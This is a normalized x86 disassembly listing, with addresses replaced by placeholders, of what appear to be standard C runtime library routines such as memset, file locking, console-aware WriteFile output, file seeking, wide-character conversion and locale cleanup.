add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
test eax eax
jne r-xdata
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
movd xmm0 eax
punpcklbw xmm0 xmm0
punpcklwd xmm0 xmm0
pshufd xmm0 xmm0 0x0
pxor xmm0 xmm0
jmp r-xdata
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
neg ebx
add ebx 0x10
sub edx ebx
push edx
mov edx ebx
and edx 0x3
je r-xdata
mov ebx edx
and edx 0x7f
shr ebx 0x7
je r-xdata
push ebx
push ecx
mov ebx ecx
and ebx 0xf
test ebx ebx
jne r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec ebx
jne r-xdata
pop edx
jmp r-xdata
movd [ ecx ] xmm0
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop eax
pop ebx
retn
mov ebx edx
shr ebx 0x4
je r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov ebx edx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec ebx
jne r-xdata
and ebx 0x3
je r-xdata
movd [ ecx ] xmm0
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] al
inc ecx
dec ebx
jne r-xdata
sub_10045f50
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_1003f09c
mov [ rw-data ] eax
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
push 0x4
push esi
mov [ rw-data ] esi
call sub_1003f09c
mov [ rw-data ] eax
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
pop esi
retn
mov eax [ rw-data ]
jmp r-xdata
push 0x1a
pop eax
pop esi
retn
mov [ edx + eax ] ecx
add ecx 0x20
lea edx [ edx + 0x4 ]
cmp ecx rw-data
jge r-xdata
sub_10045ff0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov ecx rw-data
cmp esi ecx
jb r-xdata
lea eax [ esi + 0x20 ]
push eax
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov eax esi
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_10045009
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_1004602f
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_10045009
mov eax [ ebp + 0xc ]
pop ecx
or [ eax + 0xc ] 0x8000
pop ebp
retn
sub_1004605f
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_10045173
pop ecx
pop ebp
retn
sub_10046099
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp ecx 0x14
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
lea eax [ ecx + 0x10 ]
push eax
call sub_10045173
pop ecx
pop ebp
retn
sub_100460c6
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
pop ebp
retn
call sub_100417ee
mov [ eax ] 0x16
call sub_1003fe28
or eax 0xffffffff
pop ebp
retn
sub_100460ea
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_100417ee
mov [ eax ] 0x9
jmp r-xdata
call sub_100417ee
mov [ eax ] 0x9
call sub_1003fe28
cmp ecx [ rw-data ]
jae r-xdata
xor eax eax
pop ebp
retn
mov eax ecx
and ecx 0x1f
sar eax 0x5
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
movsx eax [ eax + ecx + 0x4 ]
and eax 0x40
pop ebp
retn
sub_1004613e
push 0x10
push r--data
call sub_1003f180
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_100417ba
mov [ eax ] ebx
call sub_100417ee
mov [ eax ] 0x9
jmp r-xdata
call sub_100417ba
mov [ eax ] ebx
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ebx esi
sar ebx 0x5
mov edi esi
and edi 0x1f
shl edi 0x6
mov eax [ ebx * 4 + rw-data ]
movsx eax [ eax + edi + 0x4 ]
and eax 0x1
jne r-xdata
push esi
call sub_100487ba
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx * 4 + rw-data ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_100417ba
and [ eax ] 0x0
jmp r-xdata
call sub_100417ee
mov [ eax ] 0x9
call sub_100417ba
and [ eax ] 0x0
or edi 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_1004622d
add esp 0xc
mov edi eax
jmp r-xdata
call sub_100417ee
mov [ eax ] 0x9
call sub_1003fe28
call sub_1003f1c5
retn
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10046205
mov eax edi
jmp r-xdata
sub_1004622d
push ebp
mov ebp esp
mov eax 0x1af0
call sub_10048ab0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x1abc ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push esi
xor esi esi
mov [ ebp - 0x1ac8 ] eax
push edi
xor edi edi
mov [ ebp - 0x1ad0 ] ecx
mov [ ebp - 0x1ac0 ] esi
cmp [ ebp + 0x10 ] esi
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
jmp r-xdata
mov edx eax
mov ecx eax
sar edx 0x5
and ecx 0x1f
shl ecx 0x6
mov [ ebp - 0x1ad8 ] edx
push ebx
mov edx [ edx * 4 + rw-data ]
mov [ ebp - 0x1adc ] ecx
mov bl [ ecx + edx + 0x24 ]
add bl bl
sar bl 0x1
cmp bl 0x2
je r-xdata
call sub_100417ba
and [ eax ] esi
call sub_100417ee
mov [ eax ] 0x16
call sub_1003fe28
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_1003c623
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x10 ]
not eax
test al 0x1
jne r-xdata
cmp bl 0x1
jne r-xdata
mov eax [ ebp - 0x1ac8 ]
call sub_100417ba
and [ eax ] esi
call sub_100417ee
mov [ eax ] 0x16
call sub_1003fe28
jmp r-xdata
test [ ecx + edx + 0x4 ] 0x20
je r-xdata
push [ ebp - 0x1ac8 ]
call sub_100460ea
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push eax
call sub_10046b8e
add esp 0x10
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x1ad8 ]
mov ecx [ eax * 4 + rw-data ]
mov eax [ ebp - 0x1adc ]
test [ eax + ecx + 0x4 ] 0x80
je r-xdata
mov eax [ ebp - 0x1ad8 ]
mov ecx [ ebp - 0x1adc ]
mov eax [ eax * 4 + rw-data ]
test [ ecx + eax + 0x4 ] 0x80
je r-xdata
pop ebx
push 0x0
lea edx [ ebp - 0x1ae0 ]
push edx
push [ ebp + 0x10 ]
push [ ebp - 0x1ad0 ]
push [ eax + ecx ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1ad0 ]
xor edi edi
mov [ ebp - 0x1acc ] edi
test bl bl
jne r-xdata
call sub_100424a8
xor ecx ecx
mov eax [ eax + 0x6c ]
cmp [ eax + 0xa8 ] ecx
lea eax [ ebp - 0x1ae8 ]
push eax
mov eax [ ebp - 0x1ad8 ]
sete cl
mov [ ebp - 0x1ac4 ] ecx
mov ecx [ ebp - 0x1adc ]
mov eax [ eax * 4 + rw-data ]
push [ ecx + eax ]
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
mov esi [ ebp - 0x1ae0 ]
xor edi edi
jmp r-xdata
mov ecx edx
cmp bl 0x2
jne r-xdata
mov ebx [ ebp + 0x10 ]
mov [ ebp - 0x1ac8 ] edx
test ebx ebx
je r-xdata
cmp [ ebp - 0x1ac4 ] esi
je r-xdata
mov ecx [ ebp - 0x1abc ]
mov ebx [ ebp + 0x10 ]
mov [ ebp - 0x1ac8 ] ecx
test ebx ebx
je r-xdata
cmp [ ebp + 0x10 ] esi
jbe r-xdata
mov eax [ ebp - 0x1ad8 ]
mov ecx [ ebp - 0x1adc ]
mov eax [ eax * 4 + rw-data ]
test [ ecx + eax + 0x4 ] 0x40
je r-xdata
xor ecx ecx
lea edi [ ebp - 0x140c ]
mov eax edx
mov [ ebp - 0x1ac4 ] ecx
sub eax [ ebp - 0x1ad0 ]
call [ GetConsoleCP@IAT ]
mov edx [ ebp - 0x1ad0 ]
xor ecx ecx
and [ ebp - 0x1ac8 ] ecx
mov [ ebp - 0x1af0 ] eax
mov [ ebp - 0x1acc ] ecx
mov [ ebp - 0x1ad4 ] edx
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
test bl bl
je r-xdata
sub esi ecx
mov eax esi
test edi edi
je r-xdata
mov [ ebp - 0x1aec ] 0xa
mov [ ebp - 0x1aec ] 0xa
call sub_100417ee
mov [ eax ] 0x1c
call sub_100417ba
and [ eax ] 0x0
cmp [ edx ] 0x1a
jne r-xdata
mov ecx [ ebp - 0x1adc ]
lea eax [ ebp - 0x140c ]
sub edi eax
lea eax [ ebp - 0x1ae0 ]
push 0x0
push eax
push edi
lea eax [ ebp - 0x140c ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax * 4 + rw-data ]
push [ ecx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov cl [ edx ]
inc edx
inc eax
mov [ ebp - 0x1ae1 ] cl
cmp cl 0xa
mov [ ebp - 0x1ac8 ] edx
mov ecx [ ebp - 0x1ac4 ]
jne r-xdata
mov eax [ ebp - 0x1ad4 ]
xor edx edx
mov [ ebp - 0x1ac0 ] edx
mov [ ebp - 0x1aec ] 0xa
mov edx [ ebp - 0x1ad0 ]
push 0x5
pop ebx
cmp edi ebx
jne r-xdata
xor esi esi
lea ecx [ ebp - 0xd64 ]
push esi
push esi
push 0xd55
push ecx
lea ecx [ ebp - 0x1ab8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov esi [ ebp - 0x1ac0 ]
mov edi [ ebp - 0x1acc ]
mov [ ebp - 0x1ac4 ] eax
test eax eax
je r-xdata
movzx esi [ edi ]
add ecx 0x2
add edi 0x2
mov [ ebp - 0x1ac8 ] edi
cmp si [ ebp - 0x1aec ]
jne r-xdata
lea eax [ ebp - 0x140c ]
mov [ ebp - 0x1ac4 ] ecx
mov ecx [ ebp - 0x1adc ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ae0 ]
push eax
push ebx
lea eax [ ebp - 0x140c ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax * 4 + rw-data ]
push [ ecx + eax ]
call [ WriteFile@IAT ]
mov esi [ ebp - 0x1ac0 ]
mov edi [ ebp - 0x1acc ]
test eax eax
je r-xdata
movzx edi [ ecx ]
add eax 0x2
add ecx 0x2
cmp di [ ebp - 0x1aec ]
jne r-xdata
xor eax eax
jmp r-xdata
add esi [ ebp - 0x1ae0 ]
cmp [ ebp - 0x1ae0 ] edi
jl r-xdata
mov dl [ ebp - 0x1ae1 ]
mov [ edi ] dl
inc edi
mov edx [ ebp - 0x1ac8 ]
inc ecx
mov [ ebp - 0x1ac4 ] ecx
cmp ecx 0x13ff
jb r-xdata
inc [ ebp - 0x1abc ]
mov [ edi ] 0xd
inc edi
inc ecx
cmp bl 0x1
je r-xdata
mov dl [ eax ]
xor eax eax
mov ecx [ ebp - 0x1adc ]
cmp dl 0xa
sete al
mov [ ebp - 0x1ae8 ] eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax * 4 + rw-data ]
mov [ ebp - 0x1ac4 ] eax
cmp [ ecx + eax + 0x38 ] edi
je r-xdata
push edi
call sub_100417cd
pop ecx
jmp r-xdata
call sub_100417ee
mov [ eax ] 0x9
call sub_100417ba
mov [ eax ] ebx
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x1ac0 ] ecx
mov [ eax ] si
add edx 0x2
add eax 0x2
cmp edx 0x6a8
jb r-xdata
push 0xd
pop edi
mov [ eax ] di
add eax 0x2
mov edi [ ebp - 0x1ac8 ]
add edx 0x2
add esi [ ebp - 0x1ae0 ]
mov [ ebp - 0x1ac0 ] esi
cmp [ ebp - 0x1ae0 ] ebx
jl r-xdata
mov [ ebx ] di
add edx 0x2
add ebx 0x2
cmp edx 0x13fe
jb r-xdata
add [ ebp - 0x1abc ] 0x2
mov [ ebx ] si
add ebx 0x2
add edx 0x2
mov edi [ ebp - 0x1acc ]
mov edx [ ebp - 0x1ac8 ]
mov eax edx
sub eax [ ebp - 0x1ad0 ]
cmp eax ebx
jb r-xdata
cmp eax ebx
jae r-xdata
movzx ecx [ eax ]
xor edx edx
cmp cx [ ebp - 0x1aec ]
mov [ ebp - 0x1acc ] ecx
sete dl
add eax 0x2
mov [ ebp - 0x1ac4 ] edx
mov edx [ ebp - 0x1ac0 ]
add edx 0x2
mov [ ebp - 0x1ad4 ] eax
mov [ ebp - 0x1ac0 ] edx
cmp bl 0x2
jne r-xdata
movsx eax dl
push eax
call sub_10046c81
pop ecx
test eax eax
je r-xdata
mov al [ ecx + eax + 0x34 ]
mov [ ebp - 0xc ] al
mov eax [ ebp - 0x1ac4 ]
mov [ ebp - 0xb ] dl
push 0x2
and [ ecx + eax + 0x38 ] edi
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov ecx [ ebp - 0x1ac0 ]
mov edi eax
mov eax [ ebp - 0x1ac4 ]
mov [ ebp - 0x1acc ] edi
mov ecx [ ebp - 0x1ac0 ]
add ecx [ ebp - 0x1ae0 ]
mov eax [ ebp - 0x1ac4 ]
mov [ ebp - 0x1ac0 ] ecx
cmp eax ecx
jg r-xdata
cmp ecx ebx
jae r-xdata
mov ecx [ ebp - 0x1ac4 ]
mov eax ecx
mov edx [ ebp - 0x1ad0 ]
sub eax edx
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp eax [ ebp + 0x10 ]
jae r-xdata
push ecx
call sub_10048a68
pop ecx
mov ecx [ ebp - 0x1acc ]
cmp ax cx
jne r-xdata
cmp bl 0x2
jne r-xdata
cmp bl 0x1
je r-xdata
push 0x1
push [ ebp - 0x1ad4 ]
mov eax [ ebp - 0x1ad0 ]
mov edx [ ebp - 0x1ad4 ]
sub eax edx
add eax [ ebp + 0x10 ]
cmp eax 0x1
jbe r-xdata
lea eax [ ebp - 0x1acc ]
push eax
call sub_10048a50
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov ecx [ ebp - 0x1ac8 ]
mov esi ecx
mov edx [ ebp - 0x1ad0 ]
sub esi edx
mov [ ebp - 0x1ac0 ] esi
cmp esi ebx
jb r-xdata
push 0x0
sub eax ecx
lea edx [ ebp - 0x1ae0 ]
push edx
push eax
lea eax [ ebp - 0xd64 ]
add eax ecx
mov ecx [ ebp - 0x1adc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax * 4 + rw-data ]
push [ ecx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
jmp r-xdata
and [ ebp - 0x1ae8 ] 0x0
lea ebx [ ebp - 0x140c ]
mov eax ecx
push 0xd
sub eax edx
mov edx [ ebp - 0x1ae8 ]
pop esi
jmp r-xdata
add esi 0x2
cmp [ ebp - 0x1ac4 ] edi
je r-xdata
cmp edx [ ebp + 0x10 ]
jb r-xdata
mov eax [ ebp - 0x1ad4 ]
mov ebx [ ebp - 0x1ad8 ]
inc esi
mov al [ edx ]
mov edx [ ebp - 0x1adc ]
mov ecx [ ebx * 4 + rw-data ]
mov [ edx + ecx + 0x34 ] al
mov eax [ ebx * 4 + rw-data ]
mov [ edx + eax + 0x38 ] 0x1
jmp r-xdata
push 0x2
push edx
lea eax [ ebp - 0x1acc ]
push eax
call sub_10048a50
add esp 0xc
cmp eax 0xffffffff
je r-xdata
and [ ebp - 0x1ae8 ] 0x0
lea eax [ ebp - 0x1ab8 ]
mov edi [ ebp - 0x1ac8 ]
sub ecx edx
mov edx [ ebp - 0x1ae8 ]
jmp r-xdata
cmp eax ecx
jg r-xdata
mov edx [ ebp - 0x1ac0 ]
mov eax [ ebp - 0x1ad4 ]
push 0xd
pop eax
push eax
mov [ ebp - 0x1acc ] eax
call sub_10048a68
pop ecx
mov ecx [ ebp - 0x1acc ]
cmp ax cx
jne r-xdata
and [ ebp - 0x1ac4 ] edi
test bl bl
jne r-xdata
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x1ac8 ]
push ecx
mov ecx [ ebp - 0x1adc ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax * 4 + rw-data ]
push [ ecx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1ad4 ]
inc eax
inc [ ebp - 0x1ac0 ]
jmp r-xdata
inc esi
inc [ ebp - 0x1abc ]
mov esi [ ebp - 0x1ac0 ]
mov ecx [ ebp - 0x1abc ]
add esi ecx
mov eax [ ebp - 0x1ac4 ]
cmp [ ebp - 0x1ac8 ] eax
jl r-xdata
xor ecx ecx
inc eax
inc [ ebp - 0x1ac0 ]
push ecx
push ecx
push 0x5
mov [ ebp - 0x1ad4 ] eax
lea eax [ ebp - 0xc ]
push eax
push 0x1
lea eax [ ebp - 0x1acc ]
push eax
push ecx
push [ ebp - 0x1af0 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x1ac4 ] eax
test eax eax
je r-xdata
test esi esi
jne r-xdata
cmp [ ebp - 0x1ae8 ] edi
je r-xdata
mov ecx [ ebp - 0x1acc ]
jmp r-xdata
mov ecx [ ebp - 0x1adc ]
lea eax [ ebp - 0x1ac8 ]
push 0x0
push eax
push 0x1
lea eax [ ebp - 0xc ]
mov [ ebp - 0xc ] 0xd
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax * 4 + rw-data ]
push [ ecx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x1
jl r-xdata
inc [ ebp - 0x1abc ]
inc esi
sub_10046a92
push 0x18
push r--data
call sub_1003f180
or esi 0xffffffff
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] esi
mov edi [ ebp + 0x8 ]
cmp edi 0xfffffffe
jne r-xdata
test edi edi
js r-xdata
call sub_100417ba
and [ eax ] 0x0
call sub_100417ee
mov [ eax ] 0x9
jmp r-xdata
call sub_100417ba
and [ eax ] 0x0
call sub_100417ee
mov [ eax ] 0x9
call sub_1003fe28
cmp edi [ rw-data ]
jae r-xdata
mov edx esi
mov eax edi
sar eax 0x5
mov [ ebp - 0x1c ] eax
mov ebx edi
and ebx 0x1f
shl ebx 0x6
mov eax [ eax * 4 + rw-data ]
movsx eax [ eax + ebx + 0x4 ]
and eax 0x1
je r-xdata
push edi
call sub_100487ba
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x1c ]
mov eax [ eax * 4 + rw-data ]
test [ eax + ebx + 0x4 ] 0x1
je r-xdata
call sub_100417ee
mov [ eax ] 0x9
call sub_100417ba
and [ eax ] 0x0
mov ebx esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_10046b8e
add esp 0x10
mov esi eax
mov ebx edx
jmp r-xdata
mov eax esi
call sub_1003f1c5
retn
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10046b64
mov edx ebx
jmp r-xdata
sub_10046b8e
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_100488ce
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ SetFilePointerEx@IAT ]
test eax eax
jne r-xdata
call sub_100417ee
mov [ eax ] 0x9
mov eax esi
and esi 0x1f
sar eax 0x5
shl esi 0x6
mov eax [ eax * 4 + rw-data ]
and [ eax + esi + 0x4 ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
push eax
call sub_100417cd
pop ecx
jmp r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax edi
mov edx edi
jmp r-xdata
sub_10046c01
push ebp
mov ebp esp
inc [ rw-data ]
push esi
mov esi 0x1000
push esi
call sub_1003f0e4
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] esi
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop esi
pop ebp
retn
sub_10046c47
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1003cf9b
mov eax [ ebp + 0x8 ]
movzx ecx al
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x90 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10046ca7
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
push esi
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_1003cf9b
mov eax [ ebp - 0x10 ]
xor esi esi
cmp [ eax + 0xa8 ] esi
jne r-xdata
call sub_100417ee
push 0x16
pop esi
mov [ eax ] esi
call sub_1003fe28
jmp r-xdata
xor eax eax
jmp r-xdata
and [ eax ] 0x0
lea ecx [ ebp + 0xc ]
mov [ ebp + 0xc ] esi
push ecx
push esi
push edi
push ebx
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push esi
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
mov ecx eax
test ecx ecx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
mov eax esi
pop esi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] esi
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
call sub_100417ee
mov [ eax ] 0x2a
call sub_100417ee
mov esi [ eax ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_100417ee
push 0x22
pop esi
mov [ eax ] esi
call sub_1003fe28
jmp r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ eax ] ecx
jmp r-xdata
mov [ eax ] 0x1
jmp r-xdata
mov [ ebx ] al
push edi
push esi
push ebx
call sub_10045ec0
add esp 0xc
push edi
push esi
push ebx
call sub_10045ec0
add esp 0xc
sub_10046df0
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_10046e85
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1003f3e3
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1003f3e3
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1003f3e3
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1003f3e3
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1003f3e3
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1003f3e3
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1003f3e3
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1003f3e3
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1003f3e3
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1003f3e3
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1003f3e3
pop ecx
mov eax [ esi + 0x4c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1003f3e3
pop ecx
push eax
call sub_1003f3e3
pop ecx
sub_10046f81
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1003f3e3
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1003f3e3
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1003f3e3
pop ecx
mov eax [ esi + 0x34 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1003f3e3
pop ecx
push eax
call sub_1003f3e3
pop ecx
sub_10046fe8
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_1003f3e3
push [ esi + 0x8 ]
call sub_1003f3e3
push [ esi + 0xc ]
call sub_1003f3e3
push [ esi + 0x10 ]
call sub_1003f3e3
push [ esi + 0x14 ]
call sub_1003f3e3
push [ esi + 0x18 ]
call sub_1003f3e3
push [ esi ]
call sub_1003f3e3
push [ esi + 0x20 ]
call sub_1003f3e3
push [ esi + 0x24 ]
call sub_1003f3e3
push [ esi + 0x28 ]
call sub_1003f3e3
push [ esi + 0x2c ]
call sub_1003f3e3
push [ esi + 0x30 ]
call sub_1003f3e3
push [ esi + 0x34 ]
call sub_1003f3e3
push [ esi + 0x1c ]
